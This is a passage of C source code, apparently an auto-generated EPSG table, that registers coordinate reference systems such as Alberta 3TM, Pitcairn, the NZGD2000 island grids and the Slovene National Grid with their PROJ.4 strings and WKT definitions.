\"PROJCS[\\\"NAD83(CSRS) / Alberta 3TM ref merid 114 W\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(CSRS)\\\",DATUM[\\\"NAD83_Canadian_Spatial_Refer\");\n    add_srs_wkt (p, 2,\n        \"ence_System\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25722210\");\n    add_srs_wkt (p, 3,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],A\");\n    add_srs_wkt (p, 4,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 5,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 6,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 7,\n        \"4617\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",-\");\n    add_srs_wkt (p, 9,\n        \"114],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\\\"fals\");\n    add_srs_wkt (p, 10,\n        \"e_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"me\");\n    add_srs_wkt (p, 11,\n        \"tre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",E\");\n    add_srs_wkt (p, 12,\n        \"AST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3780\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3781, \"epsg\", 3781,\n        \"NAD83(CSRS) / Alberta 3TM ref merid 117 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-117 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / Alberta 3TM ref merid 117 W\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(CSRS)\\\",DATUM[\\\"NAD83_Canadian_Spatial_Refer\");\n    add_srs_wkt (p, 2,\n        \"ence_System\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25722210\");\n    add_srs_wkt (p, 3,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],A\");\n    add_srs_wkt (p, 4,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 5,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 6,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 7,\n        \"4617\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",-\");\n    add_srs_wkt (p, 9,\n        \"117],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\\\"fals\");\n    add_srs_wkt (p, 10,\n        \"e_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"me\");\n    add_srs_wkt (p, 11,\n        \"tre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",E\");\n    add_srs_wkt (p, 12,\n        \"AST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3781\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3782, \"epsg\", 3782,\n        \"NAD83(CSRS) / Alberta 3TM ref merid 120 W (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / Alberta 3TM ref merid 120 W (depr\");\n    add_srs_wkt (p, 1,\n        \"ecated)\\\",GEOGCS[\\\"NAD83(CSRS)\\\",DATUM[\\\"NAD83_Canadian_\");\n    add_srs_wkt (p, 2,\n        \"Spatial_Reference_System\\\",SPHEROID[\\\"GRS 1980\\\",6378137\");\n    add_srs_wkt (p, 3,\n        \",298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0\");\n    add_srs_wkt (p, 4,\n        \",0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6140\\\"]],PRIMEM[\\\"Green\");\n    add_srs_wkt (p, 5,\n        \"wich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0\");\n    add_srs_wkt (p, 6,\n        \".0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORIT\");\n    add_srs_wkt (p, 7,\n        \"Y[\\\"EPSG\\\",\\\"4617\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"\");\n    add_srs_wkt (p, 8,\n        \"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"centra\");\n    add_srs_wkt (p, 9,\n        \"l_meridian\\\",-120],PARAMETER[\\\"scale_factor\\\",0.9999],PA\");\n    add_srs_wkt (p, 10,\n        \"RAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false_northing\\\"\");\n    add_srs_wkt (p, 11,\n        \",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\");\n    add_srs_wkt (p, 12,\n        \"\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 13,\n        \"PSG\\\",\\\"3782\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3783, \"epsg\", 3783,\n        \"Pitcairn 2006 / Pitcairn TM 2006\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=-25.06855261111111 +lon_0=-130.112967\");\n    add_proj4text (p, 1,\n        \"1111111 +k=1 +x_0=14200 +y_0=15500 +ellps=WGS84 +towgs84\");\n    add_proj4text (p, 2,\n        \"=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pitcairn 2006 / Pitcairn TM 2006\\\",GEOGCS[\\\"Pit\");\n    add_srs_wkt (p, 1,\n        \"cairn 2006\\\",DATUM[\\\"Pitcairn_2006\\\",SPHEROID[\\\"WGS 84\\\"\");\n    add_srs_wkt (p, 2,\n        \",6378137,298.257223563,AUTHORITY[\\\"EPSG\\\",\\\"7030\\\"]],TOW\");\n    add_srs_wkt (p, 3,\n        \"GS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6763\\\"]],PRIMEM\");\n    add_srs_wkt (p, 4,\n        \"[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"de\");\n    add_srs_wkt (p, 5,\n        \"gree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],\");\n    add_srs_wkt (p, 6,\n        \"AUTHORITY[\\\"EPSG\\\",\\\"4763\\\"]],PROJECTION[\\\"Transverse_Me\");\n    add_srs_wkt (p, 7,\n        \"rcator\\\"],PARAMETER[\\\"latitude_of_origin\\\",-25.068552611\");\n    add_srs_wkt (p, 8,\n        \"11111],PARAMETER[\\\"central_meridian\\\",-130.1129671111111\");\n    add_srs_wkt (p, 9,\n        \"],PARAMETER[\\\"scale_factor\\\",1],PARAMETER[\\\"false_eastin\");\n    add_srs_wkt (p, 10,\n        \"g\\\",14200],PARAMETER[\\\"false_northing\\\",15500],UNIT[\\\"me\");\n    add_srs_wkt (p, 11,\n        \"tre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",E\");\n    add_srs_wkt (p, 12,\n        \"AST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3783\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3784, \"epsg\", 3784,\n        \"Pitcairn 1967 / UTM zone 9S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=9 +south +ellps=intl +towgs84=185,165,42\");\n    add_proj4text (p, 1,\n        \",0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Pitcairn 1967 / UTM zone 9S\\\",GEOGCS[\\\"Pitcairn\");\n    add_srs_wkt (p, 1,\n        \" 1967\\\",DATUM[\\\"Pitcairn_1967\\\",SPHEROID[\\\"International\");\n    add_srs_wkt (p, 2,\n        \" 1924\\\",6378388,297,AUTHORITY[\\\"EPSG\\\",\\\"7022\\\"]],TOWGS8\");\n    add_srs_wkt (p, 3,\n        \"4[185,165,42,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6729\\\"]],PRIM\");\n    add_srs_wkt (p, 4,\n        \"EM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"\");\n    add_srs_wkt (p, 5,\n        \"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]\");\n    add_srs_wkt (p, 6,\n        \"],AUTHORITY[\\\"EPSG\\\",\\\"4729\\\"]],PROJECTION[\\\"Transverse_\");\n    add_srs_wkt (p, 7,\n        \"Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETE\");\n    add_srs_wkt (p, 8,\n        \"R[\\\"central_meridian\\\",-129],PARAMETER[\\\"scale_factor\\\",\");\n    add_srs_wkt (p, 9,\n        \"0.9996],PARAMETER[\\\"false_easting\\\",500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3784\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3785, \"epsg\", 3785,\n        \"Popular Visualisation CRS / Mercator (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon_0=0.0 \");\n    add_proj4text (p, 1,\n        \"+x_0=0.0 +y_0=0 +k=1.0 +units=m +nadgrids=@null +wktext \");\n    add_proj4text (p, 2,\n        \" +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Popular Visualisation CRS / Mercator (deprecate\");\n    add_srs_wkt (p, 1,\n        \"d)\\\",GEOGCS[\\\"Popular Visualisation CRS\\\",DATUM[\\\"Popula\");\n    add_srs_wkt (p, 2,\n        \"r_Visualisation_Datum\\\",SPHEROID[\\\"Popular Visualisation\");\n    add_srs_wkt (p, 3,\n        \" Sphere\\\",6378137,0,AUTHORITY[\\\"EPSG\\\",\\\"7059\\\"]],TOWGS8\");\n    add_srs_wkt (p, 4,\n        \"4[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6055\\\"]],PRIMEM[\\\"\");\n    add_srs_wkt (p, 5,\n        \"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degre\");\n    add_srs_wkt (p, 6,\n        \"e\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUT\");\n    add_srs_wkt (p, 7,\n        \"HORITY[\\\"EPSG\\\",\\\"4055\\\"]],PROJECTION[\\\"Mercator_1SP\\\"],\");\n    add_srs_wkt (p, 8,\n        \"PARAMETER[\\\"central_meridian\\\",0],PARAMETER[\\\"scale_fact\");\n    add_srs_wkt (p, 9,\n        \"or\\\",1],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false\");\n    add_srs_wkt (p, 10,\n        \"_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"900\");\n    add_srs_wkt (p, 11,\n        \"1\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],EXTENSION[\\\"PRO\");\n    add_srs_wkt (p, 12,\n        \"J4\\\",\\\"+proj=merc +a=6378137 +b=6378137 +lat_ts=0.0 +lon\");\n    add_srs_wkt (p, 13,\n        \"_0=0.0 +x_0=0.0 +y_0=0 +k=1.0 +units=m +nadgrids=@null +\");\n    add_srs_wkt (p, 14,\n        \"wktext  +no_defs\\\"],AUTHORITY[\\\"EPSG\\\",\\\"3785\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3786, \"epsg\", 3786,\n        \"World Equidistant Cylindrical (Sphere) (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=eqc +lat_ts=0 +lat_0=0 +lon_0=0 +x_0=0 +y_0=0 +a=6\");\n    add_proj4text (p, 1,\n        \"371007 +b=6371007 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"World Equidistant Cylindrical (Sphere) (depreca\");\n    add_srs_wkt (p, 1,\n        \"ted)\\\",GEOGCS[\\\"Unspecified datum based upon the GRS 198\");\n    add_srs_wkt (p, 2,\n        \"0 Authalic Sphere\\\",DATUM[\\\"Not_specified_based_on_GRS_1\");\n    add_srs_wkt (p, 3,\n        \"980_Authalic_Sphere\\\",SPHEROID[\\\"GRS 1980 Authalic Spher\");\n    add_srs_wkt (p, 4,\n        \"e\\\",6371007,0,AUTHORITY[\\\"EPSG\\\",\\\"7048\\\"]],AUTHORITY[\\\"\");\n    add_srs_wkt (p, 5,\n        \"EPSG\\\",\\\"6047\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 6,\n        \"G\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHOR\");\n    add_srs_wkt (p, 7,\n        \"ITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4047\\\"]],PR\");\n    add_srs_wkt (p, 8,\n        \"OJECTION[\\\"Equirectangular\\\"],PARAMETER[\\\"latitude_of_or\");\n    add_srs_wkt (p, 9,\n        \"igin\\\",0],PARAMETER[\\\"central_meridian\\\",0],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\");\n    add_srs_wkt (p, 11,\n        \"\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3786\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3787, \"epsg\", 3787,\n        \"MGI / Slovene National Grid (deprecated)\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=15 +k=0.9999 +x_0=500000 +y_\");\n    add_proj4text (p, 1,\n        \"0=-5000000 +datum=hermannskogel +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"MGI / Slovene National Grid (deprecated)\\\",GEOG\");\n    add_srs_wkt (p, 1,\n        \"CS[\\\"MGI\\\",DATUM[\\\"Militar_Geographische_Institute\\\",SPH\");\n    add_srs_wkt (p, 2,\n        \"EROID[\\\"Bessel 1841\\\",6377397.155,299.1528128,AUTHORITY[\");\n    add_srs_wkt (p, 3,\n        \"\\\"EPSG\\\",\\\"7004\\\"]],TOWGS84[577.326,90.129,463.919,5.137\");\n    add_srs_wkt (p, 4,\n        \",1.474,5.297,2.4232],AUTHORITY[\\\"EPSG\\\",\\\"6312\\\"]],PRIME\");\n    add_srs_wkt (p, 5,\n        \"M[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"d\");\n    add_srs_wkt (p, 6,\n        \"egree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]]\");\n    add_srs_wkt (p, 7,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"4312\\\"]],PROJECTION[\\\"Transverse_M\");\n    add_srs_wkt (p, 8,\n        \"ercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER\");\n    add_srs_wkt (p, 9,\n        \"[\\\"central_meridian\\\",15],PARAMETER[\\\"scale_factor\\\",0.9\");\n    add_srs_wkt (p, 10,\n        \"999],PARAMETER[\\\"false_easting\\\",500000],PARAMETER[\\\"fal\");\n    add_srs_wkt (p, 11,\n        \"se_northing\\\",-5000000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 12,\n        \"G\\\",\\\"9001\\\"]],AXIS[\\\"Y\\\",EAST],AXIS[\\\"X\\\",NORTH],AUTHOR\");\n    add_srs_wkt (p, 13,\n        \"ITY[\\\"EPSG\\\",\\\"3787\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3788, \"epsg\", 3788,\n        \"NZGD2000 / Auckland Islands TM 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=166 +k=1 +x_0=3500000 +y_0=1\");\n    add_proj4text (p, 1,\n        \"0000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no\");\n    add_proj4text (p, 2,\n        \"_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Auckland Islands TM 2000\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NZGD2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPH\");\n    add_srs_wkt (p, 2,\n        \"EROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_orig\");\n    add_srs_wkt (p, 8,\n        \"in\\\",0],PARAMETER[\\\"central_meridian\\\",166],PARAMETER[\\\"\");\n    add_srs_wkt (p, 9,\n        \"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000],P\");\n    add_srs_wkt (p, 10,\n        \"ARAMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,A\");\n    add_srs_wkt (p, 11,\n        \"UTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AX\");\n    add_srs_wkt (p, 12,\n        \"IS[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3788\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3789, \"epsg\", 3789,\n        \"NZGD2000 / Campbell Island TM 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=169 +k=1 +x_0=3500000 +y_0=1\");\n    add_proj4text (p, 1,\n        \"0000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no\");\n    add_proj4text (p, 2,\n        \"_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Campbell Island TM 2000\\\",GEOGCS[\\\"N\");\n    add_srs_wkt (p, 1,\n        \"ZGD2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPHE\");\n    add_srs_wkt (p, 2,\n        \"ROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"6167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8\");\n    add_srs_wkt (p, 5,\n        \"901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 6,\n        \"PSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTIO\");\n    add_srs_wkt (p, 7,\n        \"N[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origi\");\n    add_srs_wkt (p, 8,\n        \"n\\\",0],PARAMETER[\\\"central_meridian\\\",169],PARAMETER[\\\"s\");\n    add_srs_wkt (p, 9,\n        \"cale_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000],PA\");\n    add_srs_wkt (p, 10,\n        \"RAMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AU\");\n    add_srs_wkt (p, 11,\n        \"THORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXI\");\n    add_srs_wkt (p, 12,\n        \"S[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3789\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3790, \"epsg\", 3790,\n        \"NZGD2000 / Antipodes Islands TM 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=179 +k=1 +x_0=3500000 +y_0=1\");\n    add_proj4text (p, 1,\n        \"0000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no\");\n    add_proj4text (p, 2,\n        \"_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Antipodes Islands TM 2000\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NZGD2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPH\");\n    add_srs_wkt (p, 2,\n        \"EROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_orig\");\n    add_srs_wkt (p, 8,\n        \"in\\\",0],PARAMETER[\\\"central_meridian\\\",179],PARAMETER[\\\"\");\n    add_srs_wkt (p, 9,\n        \"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000],P\");\n    add_srs_wkt (p, 10,\n        \"ARAMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,A\");\n    add_srs_wkt (p, 11,\n        \"UTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AX\");\n    add_srs_wkt (p, 12,\n        \"IS[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3790\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3791, \"epsg\", 3791,\n        \"NZGD2000 / Raoul Island TM 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-178 +k=1 +x_0=3500000 +y_0=\");\n    add_proj4text (p, 1,\n        \"10000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +n\");\n    add_proj4text (p, 2,\n        \"o_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Raoul Island TM 2000\\\",GEOGCS[\\\"NZGD\");\n    add_srs_wkt (p, 1,\n        \"2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPHEROI\");\n    add_srs_wkt (p, 2,\n        \"D[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 3,\n        \"\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6\");\n    add_srs_wkt (p, 4,\n        \"167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\");\n    add_srs_wkt (p, 5,\n        \"\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 6,\n        \"\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTION[\\\"\");\n    add_srs_wkt (p, 7,\n        \"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",\");\n    add_srs_wkt (p, 8,\n        \"0],PARAMETER[\\\"central_meridian\\\",-178],PARAMETER[\\\"scal\");\n    add_srs_wkt (p, 9,\n        \"e_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000],PARAM\");\n    add_srs_wkt (p, 10,\n        \"ETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTHO\");\n    add_srs_wkt (p, 11,\n        \"RITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3791\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3793, \"epsg\", 3793,\n        \"NZGD2000 / Chatham Islands TM 2000\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-176.5 +k=1 +x_0=3500000 +y_\");\n    add_proj4text (p, 1,\n        \"0=10000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m \");\n    add_proj4text (p, 2,\n        \"+no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NZGD2000 / Chatham Islands TM 2000\\\",GEOGCS[\\\"N\");\n    add_srs_wkt (p, 1,\n        \"ZGD2000\\\",DATUM[\\\"New_Zealand_Geodetic_Datum_2000\\\",SPHE\");\n    add_srs_wkt (p, 2,\n        \"ROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 3,\n        \"\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 4,\n        \"\\\"6167\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8\");\n    add_srs_wkt (p, 5,\n        \"901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 6,\n        \"PSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4167\\\"]],PROJECTIO\");\n    add_srs_wkt (p, 7,\n        \"N[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origi\");\n    add_srs_wkt (p, 8,\n        \"n\\\",0],PARAMETER[\\\"central_meridian\\\",-176.5],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"scale_factor\\\",1],PARAMETER[\\\"false_easting\\\",3500000]\");\n    add_srs_wkt (p, 10,\n        \",PARAMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1\");\n    add_srs_wkt (p, 11,\n        \",AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],\");\n    add_srs_wkt (p, 12,\n        \"AXIS[\\\"Easting\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3793\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3794, \"epsg\", 3794,\n        \"Slovenia 1996 / Slovene National Grid\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=15 +k=0.9999 +x_0=500000 +y_\");\n    add_proj4text (p, 1,\n        \"0=-5000000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m \");\n    add_proj4text (p, 2,\n        \"+no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"Slovenia 1996 / Slovene National Grid\\\",GEOGCS[\");\n    add_srs_wkt (p, 1,\n        